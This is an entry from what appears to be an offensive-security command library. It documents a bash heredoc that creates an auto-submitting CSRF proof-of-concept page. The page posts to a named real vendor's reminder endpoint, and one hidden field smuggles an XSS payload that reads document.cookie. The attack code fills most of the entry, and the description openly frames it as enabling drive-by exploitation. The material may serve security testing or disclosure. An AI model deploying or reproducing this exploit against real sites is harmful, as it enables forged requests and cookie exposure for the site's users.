---
id: create-csrf-html-2024
data: >-
  cat > csrf-poc.html << EOF

  <!DOCTYPE html>

  <html>

  <body>

  <form id="xss-csrf"
  action="https://www.acronis.com/en-us/my/remind/index.html" method="POST">
    <input type="hidden" name="token" value="a016902ceaeb6ae91c21302631fbbcfc">
    <input type="hidden" name="SN" value="818198181891891981981981516518198198">
    <input type="hidden" name="OrderId" value="">
    <input type="hidden" name="Submit" value="Send E-mail">
    <input type="hidden" name="c" value='1"<!--><Svg OnLoad=(confirm)(document.cookie)<!--'>
  </form>

  <script>document.getElementById('xss-csrf').submit();</script>

  </body>

  </html>

  EOF
tags:
  - csrf
  - html
  - poc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.069Z'
verified: false
validated: true
submitted: true
---
# create-csrf-html

## Command

```bash
cat > csrf-poc.html << EOF
<!DOCTYPE html>
<html>
<body>
<form id="xss-csrf" action="https://www.acronis.com/en-us/my/remind/index.html" method="POST">
  <input type="hidden" name="token" value="a016902ceaeb6ae91c21302631fbbcfc">
  <input type="hidden" name="SN" value="818198181891891981981981516518198198">
  <input type="hidden" name="OrderId" value="">
  <input type="hidden" name="Submit" value="Send E-mail">
  <input type="hidden" name="c" value='1"<!--><Svg OnLoad=(confirm)(document.cookie)<!--'>
</form>
<script>document.getElementById('xss-csrf').submit();</script>
</body>
</html>
EOF
```

## Description

This bash command creates an HTML file for a CSRF PoC that auto-submits a form with an XSS payload to the target endpoint, facilitating drive-by exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> csrf-poc.html` | Output file name | Yes |
| `<< EOF` | Heredoc delimiter for multi-line content | Yes |

## Examples

### Basic Usage

```bash
cat > simple-csrf.html << EOF
<form action="target.com" method="POST"><input type="hidden" name="param" value="payload"><script>document.forms[0].submit();</script></form>
EOF
```

### Advanced Usage

```bash
cat > csrf-poc.html << EOF
... (full form with multiple fields)
EOF
```

## Expected Output

Creates csrf-poc.html file; loading it in a browser will auto-submit the form.

## Related

- [[Related Procedure: Create-CSRF-HTML-Page-for-XSS-Delivery]]
